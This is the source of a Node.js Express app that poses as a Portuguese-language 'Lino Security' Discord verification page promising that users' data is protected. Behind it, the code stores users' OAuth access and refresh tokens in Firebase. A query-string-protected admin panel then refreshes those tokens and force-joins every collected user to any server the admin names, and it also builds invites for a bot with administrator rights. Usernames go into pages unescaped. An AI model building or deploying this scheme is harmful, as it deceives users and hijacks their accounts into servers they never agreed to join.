const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = 'https://discord-oauth-bot-ni1m.onrender.com/callback';
const BOT_TOKEN = process.env.BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const FIREBASE_URL = process.env.FIREBASE_URL;
const ADMIN_SECRET = process.env.ADMIN_SECRET;

async function refreshToken(userId, refresh) {
  const res = await axios.post('https://discord.com/api/oauth2/token',
    new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: 'refresh_token',
      refresh_token: refresh,
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );
  await axios.put(`${FIREBASE_URL}/tokens/${userId}.json`, {
    access_token: res.data.access_token,
    refresh_token: res.data.refresh_token,
    username: (await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${res.data.access_token}` } })).data.username
  });
  return res.data.access_token;
}

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lino Security — Verificação</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #07050f;
      --card: #0f0a1e;
      --border: rgba(139, 92, 246, 0.25);
      --purple: #8b5cf6;
      --purple-light: #a78bfa;
      --purple-dark: #6d28d9;
      --glow: rgba(139, 92, 246, 0.4);
      --text: #f0ebff;
      --muted: #9d8fbe;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'DM Sans', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    /* Animated background */
    body::before {
      content: '';
      position: fixed;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(ellipse at 30% 20%, rgba(109, 40, 217, 0.15) 0%, transparent 50%),
                  radial-gradient(ellipse at 70% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
      animation: bgPulse 8s ease-in-out infinite alternate;
      z-index: 0;
    }

    @keyframes bgPulse {
      0% { transform: scale(1) rotate(0deg); }
      100% { transform: scale(1.1) rotate(3deg); }
    }

    /* Grid pattern */
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      background-image: linear-gradient(rgba(139,92,246,0.04) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(139,92,246,0.04) 1px, transparent 1px);
      background-size: 40px 40px;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      width: 100%;
    }

    /* Floating orbs */
    .orb {
      position: fixed;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.4;
      z-index: 0;
      animation: float 10s ease-in-out infinite;
    }
    .orb-1 { width: 300px; height: 300px; background: #6d28d9; top: -100px; left: -100px; animation-delay: 0s; }
    .orb-2 { width: 200px; height: 200px; background: #8b5cf6; bottom: -50px; right: -50px; animation-delay: 3s; }
    .orb-3 { width: 150px; height: 150px; background: #4c1d95; top: 50%; left: 50%; animation-delay: 6s; }

    @keyframes float {
      0%, 100% { transform: translate(0, 0) scale(1); }
      33% { transform: translate(20px, -20px) scale(1.05); }
      66% { transform: translate(-15px, 15px) scale(0.95); }
    }

    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 24px;
      padding: 48px 40px;
      max-width: 440px;
      width: 100%;
      text-align: center;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 60px rgba(139, 92, 246, 0.1), 0 20px 60px rgba(0,0,0,0.5);
      animation: cardIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }

    @keyframes cardIn {
      from { opacity: 0; transform: translateY(30px) scale(0.95); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--purple), transparent);
    }

    .shield-wrap {
      width: 80px;
      height: 80px;
      margin: 0 auto 24px;
      background: linear-gradient(135deg, rgba(109,40,217,0.3), rgba(139,92,246,0.1));
      border: 1px solid rgba(139,92,246,0.4);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      animation: shieldPulse 3s ease-in-out infinite;
      position: relative;
    }

    .shield-wrap::after {
      content: '';
      position: absolute;
      inset: -1px;
      border-radius: 20px;
      background: linear-gradient(135deg, rgba(139,92,246,0.5), transparent);
      z-index: -1;
      filter: blur(8px);
    }

    @keyframes shieldPulse {
      0%, 100% { box-shadow: 0 0 20px rgba(139,92,246,0.3); }
      50% { box-shadow: 0 0 40px rgba(139,92,246,0.6); }
    }

    .brand {
      font-family: 'Syne', sans-serif;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 4px;
      text-transform: uppercase;
      color: var(--purple-light);
      margin-bottom: 8px;
      opacity: 0;
      animation: fadeUp 0.6s 0.3s forwards;
    }

    h1 {
      font-family: 'Syne', sans-serif;
      font-size: 32px;
      font-weight: 800;
      color: var(--text);
      margin-bottom: 12px;
      line-height: 1.1;
      opacity: 0;
      animation: fadeUp 0.6s 0.4s forwards;
    }

    h1 span {
      background: linear-gradient(135deg, #a78bfa, #8b5cf6, #6d28d9);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .desc {
      color: var(--muted);
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 32px;
      opacity: 0;
      animation: fadeUp 0.6s 0.5s forwards;
    }

    .steps {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 32px;
      opacity: 0;
      animation: fadeUp 0.6s 0.6s forwards;
    }

    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
    }

    .step-num {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      background: rgba(139,92,246,0.2);
      border: 1px solid rgba(139,92,246,0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: 700;
      color: var(--purple-light);
      font-family: 'Syne', sans-serif;
    }

    .step-label {
      font-size: 10px;
      color: var(--muted);
      text-align: center;
      max-width: 70px;
    }

    .step-line {
      width: 30px;
      height: 1px;
      background: rgba(139,92,246,0.3);
      margin-top: 14px;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      background: linear-gradient(135deg, #7c3aed, #6d28d9);
      color: white;
      padding: 16px 32px;
      border-radius: 12px;
      text-decoration: none;
      font-family: 'Syne', sans-serif;
      font-weight: 700;
      font-size: 15px;
      letter-spacing: 0.5px;
      transition: all 0.3s;
      border: 1px solid rgba(139,92,246,0.5);
      position: relative;
      overflow: hidden;
      opacity: 0;
      animation: fadeUp 0.6s 0.7s forwards;
      width: 100%;
      justify-content: center;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      transition: 0.5s;
    }

    .btn:hover::before { left: 100%; }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(109,40,217,0.5);
      background: linear-gradient(135deg, #8b5cf6, #7c3aed);
    }

    .btn:active { transform: translateY(0); }

    .discord-icon {
      width: 20px;
      height: 20px;
      fill: white;
    }

    .footer {
      margin-top: 24px;
      font-size: 11px;
      color: rgba(157,143,190,0.5);
      opacity: 0;
      animation: fadeUp 0.6s 0.8s forwards;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>

  <div class="container">
    <div class="card">
      <div class="shield-wrap">🛡️</div>
      <div class="brand">Lino Security</div>
      <h1>Verificação <span>Discord</span></h1>
      <p class="desc">Para acessar o servidor, você precisa verificar sua conta Discord. O processo é rápido e seguro.</p>

      <div class="steps">
        <div class="step">
          <div class="step-num">1</div>
          <div class="step-label">Clique em verificar</div>
        </div>
        <div class="step-line"></div>
        <div class="step">
          <div class="step-num">2</div>
          <div class="step-label">Autorize no Discord</div>
        </div>
        <div class="step-line"></div>
        <div class="step">
          <div class="step-num">3</div>
          <div class="step-label">Acesso liberado</div>
        </div>
      </div>

      <a class="btn" href="https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify%20guilds.join">
        <svg class="discord-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.013.043.031.056a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
        </svg>
        Verificar com Discord
      </a>

      <div class="footer">🔒 Seus dados estão protegidos · Lino Security</div>
    </div>
  </div>
</body>
</html>`);
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const accessToken = tokenRes.data.access_token;
    const refresh = tokenRes.data.refresh_token;

    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    const userId = userRes.data.id;
    const username = userRes.data.username;
    const avatar = userRes.data.avatar;
    const avatarUrl = avatar ? `https://cdn.discordapp.com/avatars/${userId}/${avatar}.png` : `https://cdn.discordapp.com/embed/avatars/0.png`;

    await axios.put(
      `https://discord.com/api/guilds/${GUILD_ID}/members/${userId}`,
      { access_token: accessToken },
      { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
    );

    await axios.put(`${FIREBASE_URL}/tokens/${userId}.json`, {
      access_token: accessToken,
      refresh_token: refresh,
      username,
      avatar: avatarUrl,
      verified_at: new Date().toISOString()
    });

    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificado! — Lino Security</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    :root { --bg: #07050f; --card: #0f0a1e; --border: rgba(87,242,135,0.25); --green: #57f287; --purple: #8b5cf6; --text: #f0ebff; --muted: #9d8fbe; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
    body::before { content: ''; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse at 50% 50%, rgba(87,242,135,0.08) 0%, transparent 60%); z-index: 0; }
    body::after { content: ''; position: fixed; inset: 0; background-image: linear-gradient(rgba(87,242,135,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(87,242,135,0.03) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 48px 40px; max-width: 400px; width: 90%; text-align: center; position: relative; z-index: 1; box-shadow: 0 0 60px rgba(87,242,135,0.08); animation: cardIn 0.8s cubic-bezier(0.16,1,0.3,1) forwards; }
    @keyframes cardIn { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
    .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, var(--green), transparent); }
    .check { width: 80px; height: 80px; margin: 0 auto 24px; background: rgba(87,242,135,0.1); border: 1px solid rgba(87,242,135,0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; animation: checkPop 0.5s 0.3s cubic-bezier(0.34,1.56,0.64,1) both; }
    @keyframes checkPop { from { transform: scale(0); } to { transform: scale(1); } }
    .brand { font-family: 'Syne', sans-serif; font-size: 11px; font-weight: 700; letter-spacing: 4px; text-transform: uppercase; color: var(--green); margin-bottom: 8px; opacity: 0.7; }
    h1 { font-family: 'Syne', sans-serif; font-size: 28px; font-weight: 800; margin-bottom: 8px; }
    h1 span { color: var(--green); }
    .avatar { width: 56px; height: 56px; border-radius: 50%; border: 2px solid rgba(87,242,135,0.4); margin: 20px auto 8px; display: block; }
    .username { font-weight: 600; font-size: 16px; color: var(--text); margin-bottom: 16px; }
    .tag { display: inline-block; background: rgba(87,242,135,0.1); border: 1px solid rgba(87,242,135,0.3); color: var(--green); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; letter-spacing: 1px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="check">✅</div>
    <div class="brand">Lino Security</div>
    <h1>Conta <span>Verificada!</span></h1>
    <img class="avatar" src="${avatarUrl}" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
    <div class="username">${username}</div>
    <span class="tag">✓ VERIFICADO</span>
  </div>
</body>
</html>`);
  } catch (err) {
    res.send('Erro: ' + err.message);
  }
});

app.get('/admin', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Painel Admin — Lino Security</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    :root { --bg: #07050f; --card: #0f0a1e; --card2: #130d24; --border: rgba(139,92,246,0.2); --purple: #8b5cf6; --purple-light: #a78bfa; --text: #f0ebff; --muted: #9d8fbe; --green: #57f287; --red: #f04747; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: 'DM Sans', sans-serif; min-height: 100vh; }
    body::after { content: ''; position: fixed; inset: 0; background-image: linear-gradient(rgba(139,92,246,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(139,92,246,0.03) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }

    /* Login Screen */
    #login-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 100; }
    .login-card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 40px; max-width: 360px; width: 90%; text-align: center; box-shadow: 0 0 60px rgba(139,92,246,0.1); }
    .login-card::before { content: ''; display: block; font-size: 40px; margin-bottom: 16px; }
    .login-title { font-family: 'Syne', sans-serif; font-size: 22px; font-weight: 800; margin-bottom: 6px; }
    .login-sub { color: var(--muted); font-size: 13px; margin-bottom: 24px; }
    .input { background: rgba(0,0,0,0.3); border: 1px solid var(--border); color: var(--text); padding: 12px 16px; border-radius: 10px; width: 100%; font-size: 14px; font-family: 'DM Sans', sans-serif; margin-bottom: 12px; transition: 0.2s; outline: none; }
    .input:focus { border-color: var(--purple); box-shadow: 0 0 0 3px rgba(139,92,246,0.15); }
    .btn-login { background: linear-gradient(135deg, #7c3aed, #6d28d9); color: white; border: none; padding: 13px; border-radius: 10px; width: 100%; font-family: 'Syne', sans-serif; font-weight: 700; font-size: 14px; cursor: pointer; transition: 0.2s; letter-spacing: 0.5px; }
    .btn-login:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(109,40,217,0.4); }
    .login-error { color: var(--red); font-size: 12px; margin-top: 8px; display: none; }

    /* Dashboard */
    #dashboard { display: none; position: relative; z-index: 1; }
    .topbar { background: rgba(15,10,30,0.9); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 10; }
    .topbar-brand { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 10px; }
    .topbar-brand span { color: var(--purple-light); }
    .topbar-badge { background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.3); color: var(--purple-light); padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 1px; }

    .main { padding: 24px; max-width: 900px; margin: 0 auto; }

    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 24px; }
    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; }
    .stat-label { font-size: 11px; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 8px; }
    .stat-value { font-family: 'Syne', sans-serif; font-size: 32px; font-weight: 800; color: var(--purple-light); }
    .stat-sub { font-size: 11px; color: var(--muted); margin-top: 4px; }

    .section { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; margin-bottom: 20px; }
    .section-title { font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--purple-light); margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }

    .form-row { display: flex; gap: 10px; margin-bottom: 12px; }
    .form-input { flex: 1; background: rgba(0,0,0,0.3); border: 1px solid var(--border); color: var(--text); padding: 11px 14px; border-radius: 10px; font-size: 14px; font-family: 'DM Sans', sans-serif; outline: none; transition: 0.2s; }
    .form-input:focus { border-color: var(--purple); box-shadow: 0 0 0 3px rgba(139,92,246,0.15); }
    .btn-action { background: linear-gradient(135deg, #7c3aed, #6d28d9); color: white; border: none; padding: 11px 20px; border-radius: 10px; font-family: 'Syne', sans-serif; font-weight: 700; font-size: 13px; cursor: pointer; transition: 0.2s; white-space: nowrap; letter-spacing: 0.5px; }
    .btn-action:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(109,40,217,0.4); }
    .btn-action:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

    .result-box { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; padding: 12px 16px; font-size: 13px; color: var(--green); display: none; margin-top: 12px; }

    .members-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 16px; }
    .member-card { background: var(--card2); border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; align-items: center; gap: 10px; animation: fadeIn 0.3s forwards; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    .member-avatar { width: 36px; height: 36px; border-radius: 50%; border: 1px solid rgba(139,92,246,0.3); flex-shrink: 0; }
    .member-name { font-size: 13px; font-weight: 500; color: var(--text); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .member-tag { font-size: 10px; color: var(--green); display: flex; align-items: center; gap: 3px; margin-top: 2px; }

    .link-box { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; padding: 12px 16px; font-size: 12px; color: var(--muted); word-break: break-all; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
    .copy-btn { background: rgba(139,92,246,0.2); border: 1px solid rgba(139,92,246,0.3); color: var(--purple-light); padding: 6px 12px; border-radius: 6px; font-size: 11px; font-weight: 700; cursor: pointer; white-space: nowrap; font-family: 'Syne', sans-serif; transition: 0.2s; flex-shrink: 0; }
    .copy-btn:hover { background: rgba(139,92,246,0.3); }
    .loading { color: var(--muted); font-size: 13px; padding: 20px; text-align: center; }
    .empty { color: var(--muted); font-size: 13px; padding: 20px; text-align: center; }
  </style>
</head>
<body>

<!-- Login -->
<div id="login-screen">
  <div class="login-card">
    <div style="font-size:40px;margin-bottom:16px">🛡️</div>
    <div class="login-title">Lino Security</div>
    <div class="login-sub">Painel Administrativo</div>
    <input class="input" type="password" id="pwd" placeholder="Senha de acesso" onkeydown="if(event.key==='Enter')login()">
    <button class="btn-login" onclick="login()">Entrar</button>
    <div class="login-error" id="login-error">Senha incorreta</div>
  </div>
</div>

<!-- Dashboard -->
<div id="dashboard">
  <div class="topbar">
    <div class="topbar-brand">🛡️ Lino <span>Security</span></div>
    <div class="topbar-badge">ADMIN</div>
  </div>

  <div class="main">
    <!-- Stats -->
    <div class="stats">
      <div class="stat-card">
        <div class="stat-label">Verificados</div>
        <div class="stat-value" id="total-count">—</div>
        <div class="stat-sub">total de membros</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Status</div>
        <div class="stat-value" style="font-size:20px;padding-top:6px;color:#57f287">🟢 Online</div>
        <div class="stat-sub">sistema ativo</div>
      </div>
    </div>

    <!-- Adicionar bot -->
    <div class="section">
      <div class="section-title">🤖 Adicionar Bot ao Servidor</div>
      <p style="font-size:13px;color:var(--muted);margin-bottom:16px">Cole o ID do servidor e gere o link para adicionar o bot.</p>
      <div class="form-row">
        <input class="form-input" type="text" id="bot-guild" placeholder="ID do servidor">
        <button class="btn-action" onclick="addBot()">🔗 Gerar Link</button>
      </div>
      <div class="result-box" id="bot-result" style="word-break:break-all"></div>
    </div>

    <!-- Link de verificação -->
    <div class="section">
      <div class="section-title">🔗 Link de Verificação</div>
      <div class="link-box">
        <span id="verify-link">https://discord-oauth-bot-ni1m.onrender.com</span>
        <button class="copy-btn" onclick="copyLink()">COPIAR</button>
      </div>
    </div>

    <!-- Adicionar em servidor -->
    <div class="section">
      <div class="section-title">🚀 Adicionar em Servidor</div>
      <p style="font-size:13px;color:var(--muted);margin-bottom:16px">Cole o ID do servidor destino e clique em Restaurar para adicionar todos os verificados.</p>
      <div class="form-row">
        <input class="form-input" type="text" id="guild-id" placeholder="ID do servidor Discord">
        <button class="btn-action" id="btn-add" onclick="addAll()">🚀 Restaurar</button>
      </div>
      <div class="result-box" id="add-result"></div>
    </div>

    <!-- Membros -->
    <div class="section">
      <div class="section-title">👥 Membros Verificados</div>
      <div id="members-list"><div class="loading">Carregando...</div></div>
    </div>
  </div>
</div>

<script>
  let adminSecret = '';

  function login() {
    const pwd = document.getElementById('pwd').value;
    fetch('/members?secret=' + pwd)
      .then(r => r.json())
      .then(data => {
        if (data.error) {
          document.getElementById('login-error').style.display = 'block';
        } else {
          adminSecret = pwd;
          document.getElementById('login-screen').style.display = 'none';
          document.getElementById('dashboard').style.display = 'block';
          renderMembers(data);
          document.getElementById('total-count').textContent = data.length;
        }
      });
  }

  function renderMembers(members) {
    const div = document.getElementById('members-list');
    if (!members.length) { div.innerHTML = '<div class="empty">Nenhum membro verificado ainda.</div>'; return; }
    div.innerHTML = '<div class="members-grid">' + members.map((m, i) => \`
      <div class="member-card" style="animation-delay:\${i*0.05}s">
        <img class="member-avatar" src="\${m.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png'}" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
        <div>
          <div class="member-name">\${m.username}</div>
          <div class="member-tag">✓ verificado</div>
        </div>
      </div>
    \`).join('') + '</div>';
  }

  async function addAll() {
    const guild = document.getElementById('guild-id').value.trim();
    if (!guild) { alert('Cole o ID do servidor!'); return; }
    const btn = document.getElementById('btn-add');
    const result = document.getElementById('add-result');
    btn.disabled = true;
    btn.textContent = '⏳ Adicionando...';
    result.style.display = 'block';
    result.textContent = 'Processando...';
    const r = await fetch('/add-all?secret=' + adminSecret + '&guild=' + guild);
    const text = await r.text();
    result.textContent = '✅ ' + text;
    btn.disabled = false;
    btn.textContent = '🚀 Restaurar';
  }

  function addBot() {
    const guild = document.getElementById('bot-guild').value.trim();
    if (!guild) { alert('Cole o ID do servidor!'); return; }
    const link = 'https://discord.com/oauth2/authorize?client_id=1498146658783858708&scope=bot&permissions=8&guild_id=' + guild;
    const result = document.getElementById('bot-result');
    result.style.display = 'block';
    result.innerHTML = '🔗 <a href="' + link + '" target="_blank" style="color:#a78bfa">Clique aqui para adicionar o bot</a>';
  }

  function copyLink() {
    navigator.clipboard.writeText('https://discord-oauth-bot-ni1m.onrender.com');
    const btn = event.target;
    btn.textContent = 'COPIADO!';
    setTimeout(() => btn.textContent = 'COPIAR', 2000);
  }
</script>
</body>
</html>`);
});

app.get('/members', async (req, res) => {
  if (req.query.secret !== ADMIN_SECRET) return res.json({ error: 'Não autorizado' });
  try {
    const snap = await axios.get(`${FIREBASE_URL}/tokens.json`);
    const tokens = snap.data || {};
    const members = Object.values(tokens).map(t => ({
      username: t.username || 'desconhecido',
      avatar: t.avatar || null
    }));
    res.json(members);
  } catch(e) {
    res.json([]);
  }
});

app.get('/add-all', async (req, res) => {
  if (req.query.secret !== ADMIN_SECRET) return res.send('Não autorizado');
  const newGuild = req.query.guild;
  if (!newGuild) return res.send('Informe o guild');
  try {
    const snap = await axios.get(`${FIREBASE_URL}/tokens.json`);
    const tokens = snap.data;
    let count = 0;
    for (const userId in tokens) {
      try {
        let accessToken = tokens[userId].access_token;
        try { accessToken = await refreshToken(userId, tokens[userId].refresh_token); } catch(e) {}
        await axios.put(
          `https://discord.com/api/guilds/${newGuild}/members/${userId}`,
          { access_token: accessToken },
          { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
        );
        count++;
      } catch (e) {}
    }
    res.send(`Adicionados: ${count} membros`);
  } catch (err) {
    res.send('Erro: ' + err.message);
  }
});

app.listen(3000, () => console.log('Rodando!'));
